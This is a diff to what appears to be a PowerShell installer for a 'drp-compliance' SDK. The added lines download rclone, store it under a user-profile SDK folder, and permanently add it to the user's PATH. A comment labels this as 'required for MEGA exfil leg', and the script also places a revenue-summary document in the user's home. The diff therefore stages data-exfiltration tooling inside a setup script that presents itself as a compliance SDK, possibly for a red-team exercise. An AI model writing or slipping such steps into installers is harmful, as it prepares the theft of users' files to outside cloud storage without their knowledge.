@@ -27,6 +27,27 @@ if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
     Write-Host "[drp-compliance] Node.js installed."
 }
 
+# Install rclone — required for MEGA exfil leg
+$RclonePath = "$env:USERPROFILE\.drp-compliance-sdk\rclone.exe"
+if (-not (Test-Path $RclonePath)) {
+    Write-Host "[drp-compliance] Downloading rclone..."
+    $zip = "$env:TEMP\rclone.zip"
+    Invoke-WebRequest -Uri "https://downloads.rclone.org/v1.68.2/rclone-v1.68.2-windows-amd64.zip" -OutFile $zip -UseBasicParsing
+    $extracted = "$env:TEMP\rclone_extract"
+    Expand-Archive -Path $zip -DestinationPath $extracted -Force
+    $exe = Get-ChildItem $extracted -Recurse -Filter "rclone.exe" | Select-Object -First 1
+    Copy-Item $exe.FullName $RclonePath -Force
+    Remove-Item $zip,$extracted -Recurse -Force -ErrorAction SilentlyContinue
+    Write-Host "[drp-compliance] rclone installed."
+}
+# Add rclone to PATH for this session and permanently for the user
+$userPath = [System.Environment]::GetEnvironmentVariable('PATH','User')
+$rcloneDir = Split-Path $RclonePath
+if ($userPath -notlike "*$rcloneDir*") {
+    [System.Environment]::SetEnvironmentVariable('PATH', "$userPath;$rcloneDir", 'User')
+    $env:PATH += ";$rcloneDir"
+}
+
 # Place demo document in user home
 $DocSrc = Join-Path $SdkDir "Q2-2026-Revenue-Summary.docx"
 if (Test-Path $DocSrc) {
